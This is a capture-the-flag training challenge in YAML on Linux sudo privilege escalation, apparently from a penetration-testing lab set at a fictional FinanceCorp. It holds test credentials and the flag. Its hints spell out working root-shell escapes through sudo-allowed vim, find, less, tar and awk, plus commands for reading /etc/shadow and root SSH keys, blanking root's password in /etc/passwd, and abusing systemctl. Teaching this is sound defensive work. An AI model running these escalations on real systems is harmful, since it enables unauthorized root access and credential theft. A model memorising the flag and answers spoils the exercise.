name: SSH Privilege Escalation
description: FinanceCorp requires assessment of privilege escalation risks. Check sudo permissions and identify privilege escalation opportunities after SSH authentication.
difficulty: intermediate
category: privilege-escalation
duration_minutes: 120
objectives:
  - Understand sudo privileges and configuration
  - Check user sudo permissions
  - Identify privilege escalation vectors
  - Execute privileged commands
  - Capture the flag

scenario: |
  Your FinanceCorp penetration test reaches the privilege escalation phase. James
  Mitchell wants you to demonstrate how standard user accounts can escalate to
  administrative privileges.

  Privilege escalation is the process of gaining higher privileges than initially
  granted. In Linux systems, this typically means:
  - User → Root (full administrative access)
  - Limited sudo → Full sudo
  - Restricted shell → Unrestricted shell
  - Standard user → Service account

  Common privilege escalation vectors:
  - **sudo misconfiguration**: Overly permissive sudo rules
  - **SUID binaries**: Programs that run with elevated privileges
  - **Kernel exploits**: Operating system vulnerabilities
  - **Cron jobs**: Scheduled tasks with weak permissions
  - **Writable files**: Critical files with improper permissions
  - **Password reuse**: Same password for multiple accounts

  The sudo system allows controlled privilege elevation:
  - Users can run specific commands as root
  - Configured in /etc/sudoers
  - Can require password or be passwordless
  - Different rules for different users/groups

  Common sudo configurations and risks:

  **Full sudo access (DANGEROUS):**
  ```
  user ALL=(ALL:ALL) ALL
  ```
  - Can run any command as any user
  - Direct path to root

  **Specific commands (depends on command):**
  ```
  user ALL=(root) NOPASSWD: /usr/bin/vim
  ```
  - Can run vim as root without password
  - vim can spawn shell: `:!sh` = root shell
  - GTFOBins database documents exploitation

  **Groups with sudo:**
  ```
  %sudo ALL=(ALL:ALL) ALL
  ```
  - Any user in sudo group has full access
  - Check: `groups` command

  Your objective: Authenticate to FinanceCorp's SSH server, check the user's sudo
  privileges, and identify privilege escalation opportunities. Use sudo permissions
  to access restricted information.

  **Test Credentials:**
  - Username: `backup`
  - Password: `Backup2024#`

flag: "OCR{sud0_3sc}"

hints:
  - text: |
      **Privilege escalation fundamentals:**

      **What is privilege escalation:**
      - Gaining higher access than initially granted
      - Standard user → root/administrator
      - Critical for complete system compromise
      - Often required to access sensitive data

      **Types of privilege escalation:**

      **Vertical escalation:**
      - User → Root
      - Limited privileges → Full privileges
      - Standard account → Administrative account

      **Horizontal escalation:**
      - User A → User B (same privilege level)
      - Access another user's data
      - Impersonate different user

      **Common Linux privilege escalation vectors:**

      **1. sudo misconfiguration (MOST COMMON):**
      - User in sudo group
      - Specific commands allowed
      - NOPASSWD configuration
      - Wildcard in sudo rules
      - Dangerous binaries (vim, find, awk, etc.)

      **2. SUID binaries:**
      - Programs that run as file owner
      - If owner is root, runs with root privileges
      - Find: `find / -perm -4000 2>/dev/null`
      - Exploit: GTFOBins database

      **3. Kernel exploits:**
      - Vulnerabilities in Linux kernel
      - Version-specific
      - Local privilege escalation
      - Example: DirtyC0w, DirtyCred

      **4. Writable files:**
      - /etc/passwd (if writable, add root user)
      - /etc/shadow (if writable, change root password)
      - Cron jobs (if writable, execute as root)
      - Service configuration files

      **5. Cron jobs:**
      - Scheduled tasks running as root
      - Writable script executed by cron
      - PATH hijacking in cron scripts

      **6. Password reuse:**
      - Same password for multiple accounts
      - User password = root password
      - Service account passwords

      **7. Capabilities:**
      - Fine-grained privileges
      - Alternative to SUID
      - Check: `getcap -r / 2>/dev/null`

      **The sudo system:**

      **What is sudo:**
      - "Super User DO"
      - Execute commands as another user (usually root)
      - Configured in /etc/sudoers
      - Logs all sudo usage

      **Checking sudo privileges:**
      ```bash
      sudo -l
      ```
      - Lists what current user can run with sudo
      - Shows allowed commands
      - Indicates if password required

      **sudo configurations:**

      **Full access:**
      ```
      user ALL=(ALL:ALL) ALL
      ```
      Means: user can run ALL commands as ALL users

      **Specific command:**
      ```
      user ALL=(root) /usr/bin/systemctl restart apache2
      ```
      Means: Can only restart apache2 as root

      **NOPASSWD:**
      ```
      user ALL=(root) NOPASSWD: /usr/bin/vim
      ```
      Means: Can run vim as root without entering password

      **Wildcard danger:**
      ```
      user ALL=(root) /usr/bin/find *
      ```
      Means: Can run find with any arguments = privilege escalation

      **sudo abuse examples:**

      **vim/vi with sudo:**
      ```bash
      sudo vim
      :!sh
      # Now root shell
      ```

      **find with sudo:**
      ```bash
      sudo find /etc -exec /bin/sh \;
      # Executes shell as root
      ```

      **less/more with sudo:**
      ```bash
      sudo less /etc/shadow
      !sh
      # Shell as root
      ```

      **GTFOBins:**
      - Database of Unix binary exploits
      - Shows how to abuse binaries for privilege escalation
      - https://gtfobins.github.io/
      - Essential resource for penetration testing

      Privilege escalation is essential for complete system compromise.
    unlock_after_minutes: 0

  - text: |
      **Checking and using sudo privileges:**

      **sudo -l command:**
      ```bash
      $ sudo -l
      [sudo] password for user:
      ```
      - Shows what user can run with sudo
      - May require user's password
      - Lists allowed commands and configurations

      **Example outputs:**

      **Full sudo access:**
      ```bash
      $ sudo -l
      [sudo] password for backup:

      User backup may run the following commands on fin-backup-01:
          (ALL : ALL) ALL
      ```
      **Meaning:**
      - Can run any command as any user
      - Requires password
      - Direct path to root: `sudo su -`

      **Specific command with NOPASSWD:**
      ```bash
      $ sudo -l

      User backup may run the following commands on fin-backup-01:
          (root) NOPASSWD: /usr/bin/cat
      ```
      **Meaning:**
      - Can run cat as root without password
      - Can read any file: `sudo cat /etc/shadow`
      - Can read root-only files

      **Multiple commands:**
      ```bash
      $ sudo -l

      User backup may run the following commands on fin-backup-01:
          (root) NOPASSWD: /usr/bin/cat
          (root) NOPASSWD: /bin/ls
          (root) /usr/bin/vim
      ```
      **Meaning:**
      - cat and ls without password
      - vim with password
      - vim = shell escape possible

      **No sudo privileges:**
      ```bash
      $ sudo -l

      Sorry, user backup may not run sudo on fin-backup-01.
      ```
      **Meaning:**
      - No sudo access
      - Must find other privilege escalation vectors

      **Using sudo:**

      **Run command as root:**
      ```bash
      $ sudo command
      [sudo] password for user:
      ```

      **Run specific commands:**
      ```bash
      # Read root-only file
      $ sudo cat /etc/shadow

      # Edit system file
      $ sudo vim /etc/passwd

      # Restart service
      $ sudo systemctl restart apache2

      # Become root
      $ sudo su -
      # or
      $ sudo -i
      ```

      **Run without password (if NOPASSWD):**
      ```bash
      $ sudo cat /root/flag.txt
      # No password prompt, executes immediately
      ```

      **Exploiting sudo permissions:**

      **If allowed: vim, vi, nano, emacs**
      ```bash
      $ sudo vim
      :!sh
      # Or
      :!/bin/bash
      # Now running shell as root
      ```

      **If allowed: find**
      ```bash
      $ sudo find /etc -exec /bin/sh \;
      # Executes shell as root
      ```

      **If allowed: less, more**
      ```bash
      $ sudo less /etc/shadow
      !sh
      # Shell as root from within less
      ```

      **If allowed: cat (read any file)**
      ```bash
      $ sudo cat /etc/shadow
      $ sudo cat /root/.ssh/id_rsa
      $ sudo cat /root/flag.txt
      ```

      **If allowed: cp (copy files)**
      ```bash
      # Copy SSH key to gain access
      $ sudo cp /root/.ssh/id_rsa /tmp/
      $ sudo chmod 644 /tmp/id_rsa
      $ cat /tmp/id_rsa
      ```

      **If allowed: tar**
      ```bash
      $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
      # Shell as root
      ```

      **Reading sudo configuration:**
      ```bash
      $ sudo cat /etc/sudoers
      # If allowed, shows complete sudo configuration
      ```

      **Privilege escalation workflow:**

      **Step 1: Check sudo permissions**
      ```bash
      $ sudo -l
      ```

      **Step 2: Identify exploitable commands**
      - Check GTFOBins for exploitation method
      - Look for shell escape sequences
      - Identify file read capabilities

      **Step 3: Exploit**
      - Use allowed command to escalate
      - Read sensitive files
      - Gain root shell

      **Step 4: Verify root access**
      ```bash
      # whoami
      root
      # id
      uid=0(root) gid=0(root) groups=0(root)
      ```

      sudo permissions are the most common privilege escalation vector in Linux.
    unlock_after_minutes: 5

  - text: |
      **Exploiting common sudo configurations:**

      **Scenario 1: Full sudo access**

      **Configuration:**
      ```
      user ALL=(ALL:ALL) ALL
      ```

      **Exploitation:**
      ```bash
      $ sudo su -
      [sudo] password for user: [enter user password]
      # root@server:~#
      ```
      **Result:** Full root access

      **Alternative:**
      ```bash
      $ sudo -i
      $ sudo /bin/bash
      $ sudo sh
      ```

      **Scenario 2: cat with sudo**

      **Configuration:**
      ```
      user ALL=(root) NOPASSWD: /usr/bin/cat
      ```

      **Exploitation:**
      ```bash
      # Read any file as root
      $ sudo cat /etc/shadow
      $ sudo cat /root/.ssh/id_rsa
      $ sudo cat /root/flag.txt
      $ sudo cat /etc/sudoers
      ```

      **Result:** Can read any file, including:
      - Password hashes (/etc/shadow)
      - Root SSH keys
      - Sensitive files
      - Configuration files

      **Scenario 3: vim with sudo**

      **Configuration:**
      ```
      user ALL=(root) NOPASSWD: /usr/bin/vim
      ```

      **Exploitation:**
      ```bash
      $ sudo vim
      # In vim:
      :!sh
      # or
      :!/bin/bash
      # or
      :set shell=/bin/bash
      :shell
      ```

      **Result:** Root shell

      **Or open privileged file:**
      ```bash
      $ sudo vim /etc/shadow
      # Edit password hashes
      # Change root password
      ```

      **Scenario 4: find with sudo**

      **Configuration:**
      ```
      user ALL=(root) NOPASSWD: /usr/bin/find
      ```

      **Exploitation:**
      ```bash
      $ sudo find /etc -exec /bin/sh \;
      # or
      $ sudo find /etc -exec /bin/bash -p \;
      ```

      **Result:** Root shell

      **Scenario 5: less/more with sudo**

      **Configuration:**
      ```
      user ALL=(root) NOPASSWD: /usr/bin/less
      ```

      **Exploitation:**
      ```bash
      $ sudo less /etc/shadow
      # Inside less, press:
      !sh
      # or
      !/bin/bash
      ```

      **Result:** Root shell from less

      **Or just read sensitive files:**
      ```bash
      $ sudo less /etc/shadow
      $ sudo less /root/.ssh/id_rsa
      ```

      **Scenario 6: cp with sudo**

      **Configuration:**
      ```
      user ALL=(root) NOPASSWD: /bin/cp
      ```

      **Exploitation:**
      ```bash
      # Copy sensitive files to readable location
      $ sudo cp /etc/shadow /tmp/shadow
      $ cat /tmp/shadow

      # Copy SSH keys
      $ sudo cp /root/.ssh/id_rsa /tmp/root_key
      $ cat /tmp/root_key

      # Or overwrite critical files
      $ echo 'root::0:0:root:/root:/bin/bash' > /tmp/passwd
      $ sudo cp /tmp/passwd /etc/passwd
      # Root now has no password
      ```

      **Scenario 7: tar with sudo**

      **Configuration:**
      ```
      user ALL=(root) NOPASSWD: /bin/tar
      ```

      **Exploitation:**
      ```bash
      $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
      ```

      **Result:** Root shell

      **Scenario 8: systemctl with sudo**

      **Configuration:**
      ```
      user ALL=(root) NOPASSWD: /bin/systemctl
      ```

      **Exploitation:**
      ```bash
      # Create malicious service
      $ cat > /tmp/evil.service << EOF
      [Service]
      Type=oneshot
      ExecStart=/bin/sh -c "cat /root/flag.txt > /tmp/flag"
      [Install]
      WantedBy=multi-user.target
      EOF

      $ sudo systemctl link /tmp/evil.service
      $ sudo systemctl start evil
      $ cat /tmp/flag
      ```

      **Common sudo privilege escalation commands:**

      **File viewers/editors:**
      - vim, vi, nano, emacs → Shell escape
      - less, more → Shell escape
      - man → Shell escape

      **File operations:**
      - cat → Read any file
      - cp → Copy sensitive files or overwrite system files
      - mv → Move/rename files
      - chmod → Change file permissions
      - chown → Change file ownership

      **Utilities:**
      - find → Execute commands
      - tar → Command execution
      - zip → Command execution
      - git → Shell escape
      - awk → Command execution
      - sed → File manipulation

      **GTFOBins reference:**
      - vim: `sudo vim -c ':!/bin/sh'`
      - find: `sudo find . -exec /bin/sh \; -quit`
      - awk: `sudo awk 'BEGIN {system("/bin/sh")}'`
      - less: `sudo less /etc/hosts` then `!sh`

      Understanding sudo configurations enables privilege escalation exploitation.
    unlock_after_minutes: 10

